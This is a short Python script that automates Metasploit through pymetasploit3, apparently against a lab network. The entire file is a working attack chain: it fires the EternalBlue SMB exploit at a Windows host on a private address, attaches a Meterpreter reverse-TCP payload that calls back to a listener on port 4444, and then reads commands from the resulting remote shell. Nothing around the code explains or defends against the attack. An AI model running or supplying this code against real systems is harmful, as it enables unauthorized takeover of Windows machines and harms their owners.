from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('password')
# from pymetasploit3.msfrpc import MsfRpcClient
# client = MsfRpcClient('password', port=55552)
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.72'
payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
payload['LHOST'] = '192.168.1.216'
payload['LPORT'] = 4444
exploit.execute(payload=payload)
shell = client.sessions.session('1')
shell.write('?')
print(shell.read())